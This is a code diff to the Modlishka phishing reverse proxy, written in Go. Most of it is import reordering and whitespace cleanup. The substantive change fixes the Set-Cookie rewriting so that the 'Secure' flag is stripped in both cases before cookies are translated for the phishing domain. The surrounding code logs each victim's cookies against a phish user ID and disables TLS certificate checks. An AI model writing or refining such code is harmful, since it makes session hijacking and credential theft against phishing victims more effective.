@@ -20,9 +20,6 @@ import (
 	"compress/gzip"
 	"crypto/tls"
 	"fmt"
-	"github.com/drk1wi/Modlishka/config"
-	"github.com/drk1wi/Modlishka/log"
-	"github.com/drk1wi/Modlishka/plugin"
 	"io"
 	"io/ioutil"
 	"net"
@@ -32,6 +29,10 @@ import (
 	"strconv"
 	"strings"
 	"time"
+
+	"github.com/drk1wi/Modlishka/config"
+	"github.com/drk1wi/Modlishka/log"
+	"github.com/drk1wi/Modlishka/plugin"
 
 	"github.com/dsnet/compress/brotli"
 )
@@ -233,9 +234,9 @@ func (httpResponse *HTTPResponse) PatchHeaders(p *ReverseProxy) {
 		log.Cookies(p.PhishUser, p.Target.String(), httpResponse.Header["Set-Cookie"], p.IP)
 
 		for i, v := range httpResponse.Header["Set-Cookie"] {
-			//strip out the secure Flag
-			cookie := strings.Replace(v, "Secure;", "", -1)
-			cookie = RegexpFindSetCookie.ReplaceAllStringFunc(v, TranslateSetCookie)
+			r := strings.NewReplacer("Secure", "", "secure", "")
+			cookie := r.Replace(v)
+			cookie = RegexpFindSetCookie.ReplaceAllStringFunc(cookie, TranslateSetCookie)
 			log.Debugf("Rewriting Set-Cookie Flags: from \n[%s]\n --> \n[%s]\n", httpResponse.Header["Set-Cookie"][i], cookie)
 			httpResponse.Header["Set-Cookie"][i] = cookie
 		}
@@ -460,13 +461,12 @@ func (s *Settings) NewReverseProxy() *ReverseProxy {
 		OriginalTarget: s.originaltarget,
 	}
 
-
 	// Ignoring invalid target certificates
 	rp.Proxy.Transport = &http.Transport{
 
 		TLSClientConfig: &tls.Config{
 			InsecureSkipVerify: true,
-			Renegotiation: tls.RenegotiateFreelyAsClient,
+			Renegotiation:      tls.RenegotiateFreelyAsClient,
 		},
 		DialContext: (&net.Dialer{
 			Timeout:   10 * time.Second,
@@ -476,7 +476,6 @@ func (s *Settings) NewReverseProxy() *ReverseProxy {
 		ResponseHeaderTimeout: 10 * time.Second,
 		ExpectContinueTimeout: 1 * time.Second,
 		IdleConnTimeout:       5 * time.Second,
-
 	}
 
 	// Handling: Request
